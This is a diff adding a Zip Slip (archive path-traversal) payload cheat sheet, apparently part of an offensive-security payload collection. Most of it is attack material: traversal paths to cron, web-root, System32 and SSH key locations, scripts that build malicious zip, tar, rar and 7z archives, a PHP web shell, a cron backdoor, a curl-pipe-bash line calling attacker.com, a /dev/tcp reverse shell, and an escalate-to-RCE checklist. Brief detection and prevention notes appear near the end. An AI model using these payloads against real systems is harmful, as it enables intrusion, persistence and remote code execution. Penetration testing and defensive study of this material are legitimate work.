@@ -1,0 +1,351 @@
+# Zip Slip (Path Traversal via Archive Extraction) Payloads
+
+## ========================================
+## BASIC ZIP SLIP
+## ========================================
+
+# Create malicious zip
+# File name: ../../../../tmp/evil.sh
+
+# Linux path traversal
+../../../../etc/cron.d/evil
+../../../../tmp/evil.sh
+../../../../var/www/html/shell.php
+
+# Windows path traversal
+..\..\..\..\Windows\System32\evil.dll
+..\..\..\..\Users\Public\evil.exe
+
+## ========================================
+## CREATING MALICIOUS ZIP
+## ========================================
+
+# Python script to create zip slip
+import zipfile
+
+zip_file = zipfile.ZipFile('malicious.zip', 'w')
+zip_file.writestr('../../../../tmp/evil.sh', '#!/bin/bash\nwhoami')
+zip_file.close()
+
+# Command line (Linux)
+ln -s /tmp/evil.sh evil.sh
+zip --symlinks malicious.zip evil.sh
+
+## ========================================
+## TAR SLIP
+## ========================================
+
+# Create malicious tar
+tar -cf malicious.tar --transform='s|^|../../../../tmp/|' evil.sh
+
+# With symbolic links
+ln -s /etc/passwd link
+tar -cf malicious.tar link
+
+## ========================================
+## RAR SLIP
+## ========================================
+
+# Create malicious rar
+rar a malicious.rar ../../../../tmp/evil.sh
+
+## ========================================
+## 7Z SLIP
+## ========================================
+
+# Create malicious 7z
+7z a malicious.7z ../../../../tmp/evil.sh
+
+## ========================================
+## SYMLINK EXPLOITATION
+## ========================================
+
+# Symbolic link to sensitive file
+ln -s /etc/passwd passwd.txt
+zip malicious.zip passwd.txt
+
+# Extract leads to symlink pointing to /etc/passwd
+
+## ========================================
+## WEB SHELL UPLOAD
+## ========================================
+
+# PHP web shell via zip slip
+# Create zip with: ../../../../var/www/html/shell.php
+
+<?php
+if(isset($_GET['cmd'])){
+    system($_GET['cmd']);
+}
+?>
+
+## ========================================
+## CRON JOB INJECTION
+## ========================================
+
+# Inject cron job (Linux)
+# File path: ../../../../etc/cron.d/evil
+
+# Cron content
+* * * * * root /tmp/evil.sh
+
+## ========================================
+## SSH KEY INJECTION
+## ========================================
+
+# Overwrite authorized_keys
+# Path: ../../../../root/.ssh/authorized_keys
+
+# Content: attacker's public key
+ssh-rsa AAAAB3NzaC1... attacker@evil.com
+
+## ========================================
+## AUTOSTART EXPLOITATION
+## ========================================
+
+# Windows autostart
+..\..\..\..\Users\<USER>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.exe
+
+# Linux autostart
+../../../../home/<USER>/.config/autostart/evil.desktop
+
+## ========================================
+## CONFIGURATION FILE OVERWRITE
+## ========================================
+
+# Overwrite application config
+../../../../var/www/app/config/database.yml
+
+# Content
+production:
+  host: attacker.com
+  username: admin
+  password: hacked
+
+## ========================================
+## CODE INJECTION
+## ========================================
+
+# Python __init__.py
+../../../../var/www/app/__init__.py
+
+# Content
+import os
+os.system('curl http://attacker.com/payload.sh | bash')
+
+## ========================================
+## LIBRARY INJECTION
+## ========================================
+
+# Shared library (Linux)
+../../../../usr/lib/evil.so
+
+# DLL (Windows)
+..\..\..\..\Windows\System32\evil.dll
+
+## ========================================
+## TESTING METHODOLOGY
+## ========================================
+
+# 1. Create malicious archive
+zip malicious.zip ../../../../tmp/test.txt
+
+# 2. Upload to application
+
+# 3. Trigger extraction
+
+# 4. Verify file placement
+ls -la /tmp/test.txt
+
+## ========================================
+## EXPLOITATION EXAMPLES
+## ========================================
+
+# Example 1: Web shell
+1. Create: ../../../../var/www/html/shell.php
+2. Upload malicious.zip
+3. Extract triggers
+4. Access: http://target.com/shell.php?cmd=whoami
+
+# Example 2: Cron backdoor
+1. Create: ../../../../etc/cron.d/backdoor
+2. Content: * * * * * root /tmp/reverse.sh
+3. Upload and extract
+4. Backdoor runs every minute
+
+## ========================================
+## PYTHON CREATION SCRIPT
+## ========================================
+
+#!/usr/bin/env python3
+import zipfile
+
+def create_zip_slip(filename, target_path, content):
+    """Create a zip slip archive"""
+    with zipfile.ZipFile(filename, 'w') as zf:
+        info = zipfile.ZipInfo(target_path)
+        zf.writestr(info, content)
+
+# Create malicious zip
+create_zip_slip(
+    'malicious.zip',
+    '../../../../tmp/evil.sh',
+    '#!/bin/bash\nbash -i >& /dev/tcp/10.10.10.10/4444 0>&1'
+)
+
+## ========================================
+## ABSOLUTE PATH
+## ========================================
+
+# Some extractors vulnerable to absolute paths
+/etc/cron.d/evil
+/var/www/html/shell.php
+C:\Windows\System32\evil.dll
+
+## ========================================
+## MIXED SEPARATORS
+## ========================================
+
+# Windows
+..\..\..\..\Windows\System32\evil.dll
+../../Windows/System32/evil.dll
+
+# Linux with backslash
+..\\..\\..\\..\\tmp\\evil.sh
+
+## ========================================
+## ENCODED PATHS
+## ========================================
+
+# URL encoded
+..%2F..%2F..%2F..%2Ftmp%2Fevil.sh
+
+# Double encoded
+..%252F..%252F..%252F..%252Ftmp%252Fevil.sh
+
+## ========================================
+## NULL BYTE INJECTION
+## ========================================
+
+# Bypass extension check
+../../../../tmp/evil.sh%00.txt
+
+## ========================================
+## LONG PATH EXPLOITATION
+## ========================================
+
+# Create very long path
+../../../../[repeat]/tmp/evil.sh
+
+# May bypass some sanitization
+
+## ========================================
+## REAL-WORLD TARGETS
+## ========================================
+
+# Web applications
+File upload with zip extraction
+
+# CI/CD systems
+Artifact processing
+
+# Package managers
+Plugin/theme installation
+
+# Backup systems
+Archive restoration
+
+## ========================================
+## VULNERABLE FUNCTIONS
+## ========================================
+
+# Python
+zipfile.extractall() without validation
+
+# Java
+ZipInputStream without path validation
+
+# PHP
+ZipArchive::extractTo() without checks
+
+# Node.js
+extract-zip, unzip without validation
+
+## ========================================
+## DETECTION
+## ========================================
+
+# Check archive contents
+unzip -l malicious.zip | grep "\.\."
+tar -tf malicious.tar | grep "\.\."
+
+# Verify extraction paths
+Before extracting, check all file paths
+
+## ========================================
+## TOOLS
+## ========================================
+
+# Create malicious zips
+- evilarc (Python tool)
+- Custom scripts
+
+# Test extraction
+unzip, tar, 7z with various archives
+
+# Burp Suite
+Upload malicious archives
+
+## ========================================
+## EVILARC USAGE
+## ========================================
+
+# Install
+pip install evilarc
+
+# Create malicious zip
+evilarc.py -o unix -p var/www/html -f shell.php shell.php
+
+# Create for Windows
+evilarc.py -o win -p "C:\Windows\System32" -f evil.dll evil.dll
+
+## ========================================
+## PREVENTION TESTING
+## ========================================
+
+# Check if application:
+- [ ] Validates file paths
+- [ ] Strips ../ sequences
+- [ ] Uses whitelist of allowed paths
+- [ ] Checks for absolute paths
+- [ ] Handles symlinks safely
+
+## ========================================
+## COMMON VULNERABLE CODE
+## ========================================
+
+# Python (vulnerable)
+import zipfile
+with zipfile.ZipFile('upload.zip') as zf:
+    zf.extractall('/tmp/extract/')  # No validation!
+
+# Java (vulnerable)
+ZipInputStream zis = new ZipInputStream(fileInputStream);
+ZipEntry entry;
+while ((entry = zis.getNextEntry()) != null) {
+    File file = new File(destDir, entry.getName());  // Dangerous!
+    // Extract...
+}
+
+## ========================================
+## EXPLOITATION CHECKLIST
+## ========================================
+
+- [ ] Identify archive upload
+- [ ] Create malicious archive
+- [ ] Test path traversal
+- [ ] Verify file placement
+- [ ] Escalate to RCE
+- [ ] Test different archive types
+- [ ] Try symlinks
+- [ ] Test absolute paths
